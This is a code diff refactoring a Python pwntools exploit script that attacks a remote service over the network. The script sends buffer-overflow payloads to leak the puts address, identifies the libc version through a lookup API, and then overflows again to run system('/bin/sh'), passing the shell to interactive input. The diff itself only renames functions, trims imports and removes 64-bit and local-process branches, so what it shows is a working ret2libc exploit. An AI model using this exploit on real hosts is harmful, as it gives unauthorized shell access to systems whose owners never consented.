@@ -1,7 +1,6 @@
 import requests
 import json
-from pwn import *
-import argparse
+from pwn import remote, process, u32, p32, p64, flat, log
 
 remoteIp = '192.168.0.155'
 remotePort = 9000
@@ -26,7 +25,7 @@ libcSearchUrl = "https://libc.rip/api/libc/"
 redirectStdErr = True
 
 # Check if reverse shell was spawned then handle user input and output for the process
-def handleReverseShell():
+def handle_reverse_shell():
     # Check if shell was sucessfully executed
     noEOF = True
     try:
@@ -53,23 +52,11 @@ def handleReverseShell():
 def leakViaPuts(conn, port,putOutAddr, msg="puts"):
     global proc
 
-    # Open process, assuming conn is an IP if port specified
-    if port!=-1:
-        proc = remote(conn,port)
-    else:
-        proc = process(conn)
+    proc = remote(conn,port)
 
-    # Create different payloads if 64bit specified
-    ## 64 bit doesn't work as it requires knowing the location of a pop rdi; ret rop gadget in the binary and prepending it
-    if arch == 8:
-        pltPutsBytes = p64(pltPuts)
-        mainAddrBytes = p64(mainAddr)
-        putOutAddrBytes = p64(putOutAddr)
-
-    else:
-        pltPutsBytes = p32(pltPuts)
-        mainAddrBytes = p32(mainAddr)
-        putOutAddrBytes = p32(putOutAddr)
+    pltPutsBytes = p32(pltPuts)
+    mainAddrBytes = p32(mainAddr)
+    putOutAddrBytes = p32(putOutAddr)
     
     # Create and send puts(*pltOutAddr) buffer overflow payload
     payload = flat(
@@ -83,7 +70,7 @@ def leakViaPuts(conn, port,putOutAddr, msg="puts"):
     proc.sendline(payload)
 
     # Skip 'outputLines_b' number of lines so the next read will be the leaked value
-    for i in range(outputLines_b):
+    for _ in range(outputLines_b):
         try:
             proc.recvline()
         except EOFError:
@@ -93,7 +80,7 @@ def leakViaPuts(conn, port,putOutAddr, msg="puts"):
     putsAddr = u32(proc.recv(4))
 
     # Skip 'outputLines_a' number of lines to make a cleaner output should the program need to read any more lines after
-    for i in range(outputLines_a):
+    for _ in range(outputLines_a):
         try:
             proc.recvline()
         except EOFError:
@@ -126,11 +113,11 @@ def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
     log.success("Executed system('/bin/sh') overflow")
 
     # Ouput next lines so next recv will be the ouput of system('/bin/sh')
-    for i in range(outputLines_a):
+    for _ in range(outputLines_a):
         print(proc.recv(timeout = 0.05))
     
     # Check if reverse shell was spawned then handle user input and output for the process
-    return handleReverseShell()
+    return handle_reverse_shell()
     
 # Get an array of all the potential libc versions that fit the puts and gets offsets provided
 def findPotentialLibcs(putsAddr,getsAddr):
@@ -189,8 +176,8 @@ if __name__ == "__main__":
 
         # Print exit message depending on the return value
         if retVal == 200:
-            print("End of file recieved.")
+            print("End of file recieved")
             break
         else:
-            log.failure(f"Recieved premature EOF")
+            log.failure("Recieved premature EOF")
             proc.close()
